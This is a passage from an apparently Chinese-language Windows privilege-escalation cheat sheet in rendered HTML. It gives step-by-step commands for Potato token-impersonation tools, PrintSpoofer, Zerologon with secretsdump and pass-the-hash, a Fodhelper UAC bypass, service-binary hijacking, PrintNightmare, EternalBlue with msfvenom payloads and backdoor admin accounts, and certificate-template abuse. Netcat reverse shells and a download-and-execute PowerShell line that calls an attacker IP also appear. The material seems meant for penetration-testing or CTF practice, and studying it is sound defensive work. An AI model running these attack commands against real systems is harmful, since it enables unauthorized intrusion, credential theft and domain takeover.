+<h3 id="03-1-JuicyPotato（滥用黄金特权）"><a href="#03-1-JuicyPotato（滥用黄金特权）" class="headerlink" title="03.1 JuicyPotato（滥用黄金特权）"></a>03.1 <a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">JuicyPotato</a>（滥用黄金特权）</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 验证漏洞</span><br>whoami /priv | findstr <span class="hljs-string">&quot;Enabled&quot;</span><br><span class="hljs-comment"># 检查“SeImpersonatePrivilege或SeAssignPrimaryToken是否已启用”，我们很好！！👌👌👌</span><br><br><span class="hljs-comment">## ------------------| Create .bat script</span><br><span class="hljs-comment">## Shell 通过 Netcat </span><br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">START</span> C:\&lt;path&gt;\nc.exe <span class="hljs-literal">-e</span> powershell.exe YourIP YourPort &gt; sh3ll.bat<br><span class="hljs-comment">## Shell 通过 Powershell </span><br>cmd.exe /c powershell <span class="hljs-literal">-ep</span> bypass <span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://10.10.14.26/rev.ps1&#x27;</span>)   <br><br><span class="hljs-comment">## ------------------| List CLSID&#x27;s</span><br>.\JuicyPotato.exe <span class="hljs-literal">-z</span> <span class="hljs-literal">-l</span> <span class="hljs-number">100</span><br><br><span class="hljs-comment">## ------------------| Execute </span><br>.\JuicyPotato.exe <span class="hljs-literal">-t</span> * <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;&#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;&quot;</span> <span class="hljs-literal">-p</span> C:\Users\Public\shell.bat <span class="hljs-literal">-l</span> <span class="hljs-number">1337</span>  <br>.\JuicyPotato.exe <span class="hljs-literal">-t</span> * <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;&#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;&quot;</span> <span class="hljs-literal">-p</span> C:\Users\Public\shell.exe <span class="hljs-literal">-l</span> <span class="hljs-number">1337</span>  <br><br><span class="hljs-comment">## ------------------| 常规选项</span><br><span class="hljs-comment"># Mandatory args:</span><br><span class="hljs-literal">-t</span> 创建进程 call: &lt;t&gt; 使用令牌W创建进程, &lt;u&gt; 创建进程为用户, &lt;*&gt; 两者都试试  <br><span class="hljs-literal">-p</span> &lt;program&gt;: 要启动的程序<br><span class="hljs-literal">-l</span> &lt;port&gt;: COM server listen port<br><br><span class="hljs-comment"># Optional args:</span><br><span class="hljs-literal">-m</span> &lt;ip&gt;: COM server listen address (default <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>)<br><span class="hljs-literal">-a</span> &lt;argument&gt;: 要传递给程序的命令行参数 (default NULL)<br><span class="hljs-literal">-k</span> &lt;ip&gt;: RPC server ip address (default <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>)<br><span class="hljs-literal">-n</span> &lt;port&gt;: RPC server listen port (default <span class="hljs-number">135</span>)<br><span class="hljs-literal">-c</span> &lt;&#123;clsid&#125;&gt;: CLSID (default BITS:&#123;<span class="hljs-number">4991</span>d34b<span class="hljs-literal">-80a1-4291-83b6-3328366b9097</span>&#125;)<br><span class="hljs-literal">-z</span> 仅测试CLSID并打印令牌的用户<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>单击<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">此处</a>查看 CLSID</li>
+</ul>
+<h3 id="03-2-RoguePotato（不再有JuicyPotato？老故事，欢迎RoguePotato！）"><a href="#03-2-RoguePotato（不再有JuicyPotato？老故事，欢迎RoguePotato！）" class="headerlink" title="03.2 RoguePotato（不再有JuicyPotato？老故事，欢迎RoguePotato！）"></a>03.2 <a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a>（<a target="_blank" rel="noopener" href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/">不再有JuicyPotato？老故事，欢迎RoguePotato！</a>）</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 运行Chisel绑定9999端口</span><br>chisel server <span class="hljs-literal">--reverse</span> <span class="hljs-literal">--port</span> <span class="hljs-number">1337</span> <span class="hljs-comment">## 从我们这边机器启动</span><br>.\chisel64.exe client &lt;MyIP&gt;:<span class="hljs-number">1337</span> <span class="hljs-built_in">R</span>:<span class="hljs-number">9999</span>:localhost:<span class="hljs-number">9999</span> <span class="hljs-comment">## 在靶机上面启动</span><br><br><span class="hljs-comment">## ------------------| 运行 socat 来连接 135 端口和 9999 端口 </span><br>sudo socat tcp<span class="hljs-literal">-listen</span>:<span class="hljs-number">135</span>,reuseaddr,fork tcp:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9999</span> <span class="hljs-comment">## 从我们这边机器启动</span><br><br><span class="hljs-comment">## ------------------| 执行流氓土豆</span><br>.\RoguePotato.exe <span class="hljs-literal">-r</span> &lt;MyIP&gt; <span class="hljs-literal">-e</span> <span class="hljs-string">&quot;powershell C:\Windows\Temp\rev.ps1&quot;</span> <span class="hljs-literal">-l</span> <span class="hljs-number">9999</span><br><span class="hljs-comment"># or </span><br>.\RoguePotato.exe <span class="hljs-literal">-r</span> &lt;MyIP&gt; <span class="hljs-literal">-e</span> <span class="hljs-string">&quot;c:\windows\temp\h4rithd.exe&quot;</span> <span class="hljs-literal">-l</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="03-3-MultiPotato"><a href="#03-3-MultiPotato" class="headerlink" title="03.3 MultiPotato"></a>03.3 <a target="_blank" rel="noopener" href="https://github.com/S3cur3Th1sSh1t/MultiPotato">MultiPotato</a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Download</span><br><span class="hljs-comment">### Bit 64</span><br><span class="hljs-built_in">wget</span> https://github.com/h4rithd/PrecompiledBinaries/raw/main/MultiPotato/Multipotatox64.exe <span class="hljs-literal">-O</span> Multipotato.exe <br><span class="hljs-comment">### Bit 32</span><br><span class="hljs-built_in">wget</span> https://github.com/h4rithd/PrecompiledBinaries/blob/main/MultiPotato/Multipotatox86.exe <span class="hljs-literal">-O</span> Multipotato.exe     <br><br><span class="hljs-comment">## ------------------| 带SpoolSample管道名称的BindShell</span><br>.\MultiPotato.exe <span class="hljs-literal">-t</span> BindShell <span class="hljs-literal">-p</span> <span class="hljs-string">&quot;pwned\pipe\spoolss&quot;</span><br><br><span class="hljs-comment">## ------------------| CreateUser与修改的PetitPotam触发器</span><br>.\Multipotato.exe <span class="hljs-literal">-t</span> CreateUser<br><br><span class="hljs-comment">## ------------------| 使用SpoolSample触发器创建ProcessAsUserW</span><br>.\Multipotato.exe <span class="hljs-literal">-t</span> CreateProcessAsUserW <span class="hljs-literal">-p</span> <span class="hljs-string">&quot;pwned\pipe\spoolss&quot;</span> <span class="hljs-literal">-e</span> <span class="hljs-string">&quot;C:\temp\stage2.exe&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="03-4-PrintSpoofer-（打印欺骗）"><a href="#03-4-PrintSpoofer-（打印欺骗）" class="headerlink" title="03.4 PrintSpoofer （打印欺骗）"></a>03.4 PrintSpoofer （打印欺骗）</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># !!! 必须安装Microsoft Visual C++Redistributable</span><br><br>.\PrintSpoofer.exe <span class="hljs-literal">-i</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;C:\\&lt;PATH&gt;\shell.exe&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="03-5-Netlogon-CVE-2020-1472"><a href="#03-5-Netlogon-CVE-2020-1472" class="headerlink" title="03.5 Netlogon | CVE 2020-1472"></a>03.5 <a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">Netlogon | CVE 2020-1472</a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell">git clone https://github.com/dirkjanm/CVE<span class="hljs-literal">-2020-1472</span>.git<br><span class="hljs-built_in">cd</span> CVE<span class="hljs-literal">-2020-1472</span><br>python3 cve<span class="hljs-literal">-2020-1472-exploit</span>.py MULTIMASTER <span class="hljs-number">10.10</span>.<span class="hljs-number">10.179</span><br><br><span class="hljs-comment"># 如果利用完成，</span><br>impacket<span class="hljs-literal">-secretsdump</span> <span class="hljs-literal">-just-dc</span> <span class="hljs-literal">-no-pass</span> MULTIMASTER\<span class="hljs-variable">$</span>@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.179</span><br><br><span class="hljs-comment"># 现在您可以使用此登录</span><br><span class="hljs-comment"># &#x27;$&#x27; 用于计算机帐户</span><br>impacket<span class="hljs-literal">-psexec</span> Administrator@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.179</span> <span class="hljs-literal">-hashes</span> <span class="hljs-number">69</span>cbf4a9b7415c9e1caf93d51d971be0:<span class="hljs-number">69</span>cbf4a9b7415c9e1caf93d51d971be0  <br></code></pre></td></tr></table></figure>
+
+<h3 id="03-6-Fodhelper-exe-UAC绕过"><a href="#03-6-Fodhelper-exe-UAC绕过" class="headerlink" title="03.6 Fodhelper.exe - UAC绕过"></a>03.6 <a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/">Fodhelper.exe - UAC绕过</a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| CMD</span><br>REG ADD HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\shell\open\command<br>REG ADD HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\shell\open\command /v DelegateExecute /t REG_SZ         <br>REG ADD HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\shell\open\command /d <span class="hljs-string">&quot;cmd.exe /c powershell -EncodedCommand SQBF..dgZFS==&quot;</span> /f                 <br>C:\Windows\System32\fodhelper.exe<br><br><span class="hljs-comment">## ------------------| Powershell</span><br><span class="hljs-variable">$program</span> = <span class="hljs-string">&quot;cmd.exe /c powershell -EncodedCommand SQBF..dgZFS==&quot;</span><br><span class="hljs-built_in">New-Item</span> <span class="hljs-string">&quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot;</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DelegateExecute&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;(default)&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$program</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">Start-Process</span> <span class="hljs-string">&quot;C:\Windows\System32\fodhelper.exe&quot;</span> <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span><br><br><span class="hljs-comment">## ------------------| Remove</span><br><span class="hljs-built_in">Remove-Item</span> <span class="hljs-string">&quot;HKCU:\Software\Classes\ms-settings\&quot;</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Force</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="03-7-服务不安全文件权限"><a href="#03-7-服务不安全文件权限" class="headerlink" title="03.7 服务不安全文件权限"></a>03.7 服务不安全文件权限</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 枚举</span><br><span class="hljs-built_in">Get-WmiObject</span> win32_service | <span class="hljs-built_in">Select-Object</span> Name, State, PathName | <span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span>.State <span class="hljs-operator">-like</span> <span class="hljs-string">&#x27;Running&#x27;</span>&#125; | findstr Serviio          <br>icacls <span class="hljs-string">&quot;C:\Program Files\Serviio\bin\ServiioService.exe&quot;</span> <span class="hljs-comment"># Check if we have BUILTIN\Users:(I)(F)</span><br><br><span class="hljs-comment">## ------------------| Exploit</span><br><span class="hljs-built_in">move</span> <span class="hljs-string">&quot;C:\Program Files\Serviio\bin\ServiioService.exe&quot;</span> <span class="hljs-string">&quot;C:\Program Files\Serviio\bin\ServiioService_original.exe&quot;</span><br><span class="hljs-built_in">move</span> revshell.exe <span class="hljs-string">&quot;C:\Program Files\Serviio\bin\ServiioService.exe&quot;</span><br>net stop Serviio <br><span class="hljs-comment">## or </span><br>wmic service <span class="hljs-built_in">where</span> caption=<span class="hljs-string">&quot;Serviio&quot;</span> get name, caption, state,startmode<br>whoami /priv | findstr SeShutdownPrivilege <span class="hljs-comment">## 禁用OK</span><br>shutdown /<span class="hljs-built_in">r</span> /t <span class="hljs-number">0</span> <br></code></pre></td></tr></table></figure>
+
+<h3 id="03-8-Windows-Print-Spooler"><a href="#03-8-Windows-Print-Spooler" class="headerlink" title="03.8 Windows Print Spooler "></a>03.8 <a target="_blank" rel="noopener" href="https://github.com/calebstewart/CVE-2021-1675">Windows Print Spooler </a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 验证漏洞</span><br>impacket<span class="hljs-literal">-rpcdump</span> <span class="hljs-selector-tag">@</span>&lt;IP&gt; | grep <span class="hljs-literal">-A2</span> <span class="hljs-literal">-B2</span> MS<span class="hljs-literal">-RPRN</span> <br><br><span class="hljs-comment">## ------------------| Download and execute</span><br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/calebstewart/CVE<span class="hljs-literal">-2021-1675</span>/main/CVE<span class="hljs-literal">-2021-1675</span>.ps1<br><span class="hljs-built_in">Import-Module</span> .\CVE<span class="hljs-literal">-2021-1675</span>.ps1<br><span class="hljs-built_in">Invoke-Nightmare</span> <br><span class="hljs-comment">## 如果您遇到任何类型的错误，如ExecutionPolicy；与evil-winrm一起尝试</span><br>evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> &lt;IP&gt; <span class="hljs-literal">-u</span> &lt;USERNAME&gt; <span class="hljs-literal">-p</span> &lt;PASSWORD&gt;  <span class="hljs-literal">-s</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">pwd</span>)<br>CVE<span class="hljs-literal">-2021-1675</span>.ps1<br>menu<br><span class="hljs-built_in">Invoke-Nightmare</span><br><br><span class="hljs-comment">## 然后使用psexec使用新的cred登录</span><br>impacket<span class="hljs-literal">-psexec</span> adm1n:<span class="hljs-string">&#x27;P@ssw0rd&#x27;</span><span class="hljs-selector-tag">@</span>&lt;IP&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="03-9-永恒之蓝-MS17-010"><a href="#03-9-永恒之蓝-MS17-010" class="headerlink" title="03.9 永恒之蓝 (MS17-010)"></a>03.9 永恒之蓝 (MS17-010)</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Check</span><br>nmap <span class="hljs-literal">-sV</span> <span class="hljs-literal">-Pn</span> <span class="hljs-literal">-p</span> <span class="hljs-number">445</span> <span class="hljs-literal">--script</span> smb<span class="hljs-literal">-vuln-ms17-010</span> <span class="hljs-variable">$IP</span><br><br><span class="hljs-comment">## ------------------| Setup</span><br>git clone https://github.com/helviojunior/MS17<span class="hljs-literal">-010</span>.git &amp;&amp; <span class="hljs-built_in">cd</span> MS17<span class="hljs-literal">-010</span><br>virtualenv <span class="hljs-literal">-p</span> python2 venv<br>source venv/bin/activate<br>pip2 install impacket pycrypto <span class="hljs-comment"># 这将得到一个错误；那很好</span><br>python checker.py &lt;IP&gt;<br>msfvenom <span class="hljs-literal">-p</span> windows/shell_reverse_tcp LHOST=&lt;YourIP&gt; LPORT=<span class="hljs-number">4545</span> <span class="hljs-operator">-f</span> exe &gt; rev.exe<br><br><span class="hljs-comment">## ------------------| 方法一</span><br>python send_and_execute.py &lt;IP&gt; rev.exe<br><br><span class="hljs-comment">## ------------------| 方法二</span><br><span class="hljs-comment">## 打开 zzz_exploit.py 文件并编辑以下行</span><br>service_exec(conn, <span class="hljs-built_in">r</span><span class="hljs-string">&#x27;cmd /c net user h4rithd Password123 /add&#x27;</span>)<br>service_exec(conn, <span class="hljs-built_in">r</span><span class="hljs-string">&#x27;cmd /c net localgroup administrators h4rithd /add&#x27;</span>)<br>python zzz_exploit.py &lt;IP&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="03-10-证书模板配置错误"><a href="#03-10-证书模板配置错误" class="headerlink" title="03.10 证书模板配置错误"></a>03.10 证书模板配置错误</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## --------------------| Using Certipy-Ad</span><br>sudo apt install certipy<span class="hljs-literal">-ad</span><br><span class="hljs-comment">## 查找易受攻击的证书模板</span><br>certipy<span class="hljs-literal">-ad</span> find <span class="hljs-literal">-u</span> &lt;USER&gt; <span class="hljs-literal">-p</span> &lt;Password&gt; <span class="hljs-literal">-dc-ip</span> &lt;IP&gt;<br>certipy<span class="hljs-literal">-ad</span> find <span class="hljs-literal">-u</span> &lt;USER&gt;<span class="hljs-selector-tag">@</span>&lt;DOMAIN&gt; <span class="hljs-literal">-p</span> &lt;Password&gt; <span class="hljs-literal">-dc-ip</span> &lt;IP&gt;<br><span class="hljs-comment">## Exploit</span><br>certipy<span class="hljs-literal">-ad</span> req <span class="hljs-string">&#x27;&lt;USER&gt;@&lt;DOMAIN&gt;:&lt;Password&gt;@&lt;IP&gt;&#x27;</span> <span class="hljs-literal">-ca</span> <span class="hljs-string">&#x27;&lt;CA Name&gt;&#x27;</span> <span class="hljs-literal">-template</span> <span class="hljs-string">&#x27;&lt;Template Name&gt;&#x27;</span> <span class="hljs-literal">-alt</span> <span class="hljs-string">&#x27;administrator@&lt;Domain&gt;&#x27;</span><br>certipy<span class="hljs-literal">-ad</span> auth <span class="hljs-literal">-pfx</span> administrator.pfx <span class="hljs-literal">-dc-ip</span> &lt;IP&gt; <span class="hljs-literal">-username</span> Administrator <span class="hljs-literal">-domain</span> &lt;Domain&gt;<br>impacket<span class="hljs-literal">-psexec</span> administrator<span class="hljs-selector-tag">@</span>&lt;IP&gt; <span class="hljs-literal">-hashes</span> &lt;HASH&gt;:&lt;HASH&gt;<br><br><span class="hljs-comment">## --------------------| Using Certify.exe</span><br><span class="hljs-built_in">wget</span> https://github.com/h4rithd/PrecompiledBinaries/raw/main/Certify/Certify.exe<br>./certify.exe find /vulnerable<br>./certify.exe request /ca:&lt;CA Name&gt; /template:&lt;Template Name&gt; /altname:Administrator             <br>openssl pkcs12 <span class="hljs-operator">-in</span> cert.pem <span class="hljs-literal">-keyex</span> <span class="hljs-literal">-CSP</span> <span class="hljs-string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> <span class="hljs-literal">-export</span> <span class="hljs-literal">-out</span> cert.pfx           <br><br><span class="hljs-comment">## --------------------| Methord II</span><br>./certify.exe find /vulnerable<br>impacket<span class="hljs-literal">-addcomputer</span> &lt;Domain&gt;/&lt;Username&gt;:<span class="hljs-string">&#x27;&lt;Password&gt;!&#x27;</span> <span class="hljs-literal">-computer-name</span> <span class="hljs-string">&#x27;HD$&#x27;</span> <span class="hljs-literal">-computer-pass</span> <span class="hljs-string">&#x27;Password123!&#x27;</span><br>ntpdate <span class="hljs-literal">-s</span> &lt;IP&gt;<br>certipy<span class="hljs-literal">-ad</span> req <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;HD$&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password123!&#x27;</span> <span class="hljs-literal">-ca</span> &lt;CA Name&gt; <span class="hljs-literal">-target</span> &lt;Domain&gt; <span class="hljs-literal">-template</span> &lt;Template Name&gt; <span class="hljs-literal">-upn</span> administrator<span class="hljs-selector-tag">@</span>&lt;Domain&gt; <span class="hljs-literal">-dns</span> &lt;Domain&gt; <span class="hljs-literal">-dc-ip</span> &lt;IP&gt;<br>certipy<span class="hljs-literal">-ad</span> cert <span class="hljs-literal">-pfx</span> administrator_authority.pfx <span class="hljs-literal">-nokey</span> <span class="hljs-literal">-out</span> user.crt<br>certipy<span class="hljs-literal">-ad</span> cert <span class="hljs-literal">-pfx</span> administrator_authority.pfx <span class="hljs-literal">-nocert</span> <span class="hljs-literal">-out</span> user.key<br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/main/Python/passthecert.py<br>python3 passthecert.py <span class="hljs-literal">-action</span> ldap<span class="hljs-literal">-shell</span> <span class="hljs-literal">-crt</span> user.crt <span class="hljs-literal">-key</span> user.key <span class="hljs-literal">-domain</span> &lt;Domain&gt; <span class="hljs-literal">-dc-ip</span> <span class="hljs-variable">$IP</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="03-11-Windows-Exploit-Suggester-WES-NG"><a href="#03-11-Windows-Exploit-Suggester-WES-NG" class="headerlink" title="03.11 Windows-Exploit-Suggester WES-NG"></a>03.11 <a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">Windows-Exploit-Suggester WES-NG</a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Install</span><br>git clone https://github.com/bitsadmin/wesng.git<br><span class="hljs-built_in">cd</span> wesng<br>chmod +x wes.py<br><br><span class="hljs-comment">## ------------------| Download latest definitions</span><br>./wes.py <span class="hljs-literal">--update</span><br>./wes.py <span class="hljs-literal">-u</span><br><br><span class="hljs-comment">## ------------------| Download latest version of WES-NG</span><br>./wes.py <span class="hljs-literal">--update-wes</span><br><br><span class="hljs-comment">## ------------------| 确定漏洞</span><br>./wes.py systeminfo.txt<br><br><span class="hljs-comment">## ------------------| 使用systeminfo和qfe文件确定漏洞</span><br>./wes.py systeminfo.txt qfe.txt<br><br><span class="hljs-comment">## ------------------| 确定漏洞并输出到文件</span><br>./wes.py systeminfo.txt <span class="hljs-literal">--output</span> vulns.csv<br>./wes.py systeminfo.txt <span class="hljs-literal">-o</span> vulns.csv<br><br><span class="hljs-comment">## ------------------| 确定明确指定KB以减少误报的漏洞</span><br>./wes.py systeminfo.txt <span class="hljs-literal">--patches</span> KB4345421 KB4487017<br>./wes.py systeminfo.txt <span class="hljs-literal">-p</span> KB4345421 KB4487017<br><br><span class="hljs-comment">## ------------------| 确定筛选出在最近安装的KB的发布日期之前发布的KB的漏洞的漏洞</span><br>./wes.py systeminfo.txt <span class="hljs-literal">--usekbdate</span><br>./wes.py systeminfo.txt <span class="hljs-literal">-d</span><br><br><span class="hljs-comment">## ------------------| 确定明确指定定义文件的漏洞</span><br>./wes.py systeminfo.txt <span class="hljs-literal">--definitions</span> C:\tmp\mydefs.zip<br><br><span class="hljs-comment">## ------------------| 仅列出利用漏洞的漏洞，不包括IE、Edge和Flash</span><br>./wes.py systeminfo.txt <span class="hljs-literal">--exploits-only</span> <span class="hljs-literal">--hide</span> <span class="hljs-string">&quot;Internet Explorer&quot;</span> Edge Flash<br>./wes.py systeminfo.txt <span class="hljs-literal">-e</span> <span class="hljs-literal">--hide</span> <span class="hljs-string">&quot;Internet Explorer&quot;</span> Edge Flash<br><br><span class="hljs-comment">## ------------------| 仅显示具有一定影响的漏洞</span><br>./wes.py systeminfo.txt <span class="hljs-literal">--impact</span> <span class="hljs-string">&quot;Remote Code Execution&quot;</span><br>./wes.py systeminfo.txt <span class="hljs-literal">-i</span> <span class="hljs-string">&quot;Remote Code Execution&quot;</span><br><br><span class="hljs-comment">## ------------------| 仅显示特定严重性的漏洞</span><br>./wes.py systeminfo.txt <span class="hljs-literal">--severity</span> critical<br>./wes.py systeminfo.txt <span class="hljs-literal">-s</span> critical<br><br><span class="hljs-comment">## ------------------| 根据Microsoft的联机更新目录验证替代性</span><br>./wes.py systeminfo.txt <span class="hljs-literal">--muc-lookup</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="03-11-Windows-内核漏洞利用"><a href="#03-11-Windows-内核漏洞利用" class="headerlink" title="03.11 Windows 内核漏洞利用"></a>03.11 Windows 内核漏洞利用</h3><p><strong>从以下位置下载所有二进制文件：</strong> <a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
